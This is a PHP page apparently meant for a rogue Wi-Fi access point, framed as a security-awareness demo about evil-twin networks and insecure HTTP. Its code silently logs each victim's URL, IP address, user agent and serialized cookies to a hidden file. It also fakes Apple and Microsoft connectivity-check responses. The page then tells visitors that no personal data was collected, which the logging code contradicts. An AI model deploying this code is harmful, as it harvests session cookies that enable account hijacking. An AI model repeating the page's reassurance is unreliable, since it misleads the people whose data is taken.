<?php
  // Choose a random name so people aren't aren't stumbling over your log (this IS NOT secure - it's just obfuscation)
  $logFileName = "myrandomname.log";

  // Make sure you specify a path with enough capacity such as a USB drive or you're not going to go very far with this!
  $logFilePath = "/sd/logging/";

  // Grab the host and full path of the requested URI
  $requestedHost = $_SERVER["HTTP_HOST"];
  $requestedUri = $requestedHost.$_SERVER["REQUEST_URI"];
  
  // Make a nice friendly URL with no www prefix (only for display purposes)
  $shortHost = str_replace("www.", "", $requestedHost);
  
  // Also grab the user agent for logging and checking if it's a captive portal request
  $userAgent = $_SERVER["HTTP_USER_AGENT"];

  // Don't log favicon requests which the browser will issue when loading the log file
  if($_SERVER["REQUEST_URI"] != "/favicon.ico")
  {
    $handle = fopen($logFilePath.$logFileName, 'a') or die("Can't open file");

    fwrite($handle, date('Y-m-d H:i:s'));
    fwrite($handle, "|");
    fwrite($handle, $requestedUri);
    fwrite($handle, "|");
    fwrite($handle, $_SERVER["REMOTE_ADDR"]);
    fwrite($handle, "|");
    fwrite($handle, $_SERVER["HTTP_ACCEPT"]);
    fwrite($handle, "|");
    fwrite($handle, $userAgent);

    fwrite($handle, "\n");

    if(!empty($_COOKIE) && is_array($_COOKIE))
    {
    	fwrite($handle, "Cookies: ");
    	fwrite($handle, serialize($_COOKIE));

    	fwrite($handle, "\n");
    }
    fclose($handle);
  }

  // This is iOS' Wi-Fi connectivity test request: http://erratasec.blogspot.com.au/2010/09/apples-secret-wispr-request.html
  // iOS 7 added some new domains to the wispr request: https://supportforums.cisco.com/docs/DOC-36523
  // Seems the iOS 7 may have a heap of domains so also check for the "CaptiveNetworkSupport" header http://forum.daviddarts.com/read.php?9,8879
  if($requestedUri == "www.apple.com/library/test/success.html"
    or $requestedHost == "www.appleiphonecell.com"
    or $requestedHost == "captive.apple.com"
	or $requestedHost == "www.ibook.info"
	or $requestedHost == "www.itools.info"
	or strpos($userAgent, "CaptiveNetworkSupport") !== false)
  {
    print_r("<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>");
    exit();
  }
  
  // This is Windows' Wi-Fi connectivity test request: http://technet.microsoft.com/en-us/library/cc766017(v=WS.10).aspx
  if($requestedUri == "www.msftncsi.com/ncsi.txt")
  {
    print_r("Microsoft NCSI");
    exit();
  }
  
  // Appearing in iOS 8
  if($requestedUri == "static.ess.apple.com/connectivity.txt")
  {
    print_r("AV was here!");
    exit();
  }
?>

<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
  <title>This is not <?php print_r($shortHost); ?>!</title>
  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0" name="viewport" />
  <style type="text/css">
    body
    {
      font-family: league-gothic,sans-serif;
      background-color: #333333;
      color: #fdfdfd;
      margin: 0;
      padding: 0;
    }

    p
    {
      font-size: 0.9em;
      line-height: 1.285em;
    }

    header, content
    {
      padding: 0 20%;
      display: block;
    }

    header
    {
      padding-bottom: 20px;
    }

    content
    {
      background-color: #222222;
      padding-top: 40px;
    }

    h1, h2
    {
      display: block;
      font-weight: bold;
      letter-spacing: 0.04em;
      padding: 10px 0;
      text-align: center;
      text-transform: uppercase;
      width: 100%;
      padding: 0;
    }

    h1
    {
      font-size: 6.8em;
      margin: 5px 0 0 0;
    }

    h2
    {
      font-size: 1.6em;
      margin: 0 0 22px 0;
    }

    h3
    {
      font-size: 1em;
      background-color: #b21563;
      display: inline;
      padding: 7px;
      margin-bottom: 10px;
      line-height: 2.2em;
    }

    hr
    {
      border: 0;
      height: 6px;
      background-color: #fdfdfd;
      width: 30%;
    }

    p
    {
      padding: 0 0 23px 0;
      margin: 10px 0 0 0;
    }

    p, li
    {
      word-wrap: break-word;
    }

    em
    {
      font-style: normal;
      color: #a7d019;
      font-size: 1.1em;
    }

    ol
    {
      color: #222222;
      font-weight: bold;
    }

    ol span
    {
      color: #666666;
    }

    div
    {
      background-color: #a7d019;
      padding: 10px;
      margin-bottom: 40px;
    }

    @media only screen and (max-width: 630px)
    {
      header, content
      {
        padding-left: 4%;
        padding-right: 4%;
      }

      h1
      {
        font-size: 5em;
      }

      h2
      {
        font-size: 1.4em;
      }
    }
  </style>
</head>
<body>
  <header>
    <h1>
      UH OH
    </h1>
    <h2>
      THIS ISN'T WHAT YOU<br />
      WERE EXPECTING!
    </h2>
    <hr />
  </header>
  <content>
    <h3>
      Where's <?php print_r($shortHost); ?>?
    </h3>
    <p>
      Double check the URL in your address bar, I'll wait...
    </p>
    <h3>
      This is a rogue wireless access point
    </h3>
    <p>
      You might have done it consciously thinking you were picking up some free Wi-Fi or your device might have done it
      accidentally. Most devices remember networks they've previously connected to and continue to look for them well
      after they're gone. But how did that get
      you here?
    </p>
    <h3>
      WILSON!!!
    </h3>
    <p>
      Let's imagine you once connected to an unprotected access point called &quot;WILSON&quot;. <em>Your phone or tablet
      or laptop is now wandering around screaming &quot;WILSON&quot;, &quot;WILSON&quot;, where are you
      &quot;WILSON&quot;?!</em> The access point you're now connected to heard that and responded with "I'm WILSON" and
      now here you are.
    </p>
    <h3>
      Cookies
    </h3>
    <p>
      Now that you're connected, <em>the device could monitor all your unencrypted traffic</em>; read any passwords you
      send, store the responses from websites you visit and grab any cookies along the way.

      <?php 
        if(empty($_COOKIE))
        {
          echo "As it turns out, your browser didn't send any cookies with this request but it could all so easily have
          been a different situation. ";
        }
        else
        {
          print_r("In fact here are your cookie names and values for ");
          print_r($shortHost);

          // ToDo: Ignore the GA cookies, there's not much of interest there
          echo ":</p><div><ol>";
          foreach ($_COOKIE as $name => $value)
          {
            $name = htmlspecialchars($name);
            $value = htmlspecialchars($value);
            echo "<li>$name: <span>$value</span></li>";
          }
          echo "</ol></div><p>";
        }
      ?>

      Often these cookies will contain enough information for an attacker to hijack your session and impersonate you;
      it's the equivalent of just handing over your phone or PC whilst you're already logged in.
    </p>
    <h3>
      Insecure websites put you at risk
    </h3>
    <p>
      It's <em>websites that do not implement proper transport
      layer protection that put you at risk.</em> You requested this site over HTTP and it sent the cookies you see
      above in an insecure fashion which, depending on their purpose, can be rather bad. That is the website's fault.
    </p>
    <h3>
      Don't trust Wi-Fi hotspots
    </h3>
    <p>
      You could just as easily have been served the actual
      page you requested and if not loaded securely it could have been monitored or manipulated by the access point you
      are presently connected to. <em>An attacker could be harvesting your info and you would be none the wiser.</em>
    </p>
    <h3>
      But don't worry...
    </h3>
    <p>
      Fortunately this is a friendly rogue access point. No personal data has been collected and you've learnt
      something new about Wi-Fi and website security. Have a nice day!
    </p>
  <content>
</body>
</html>
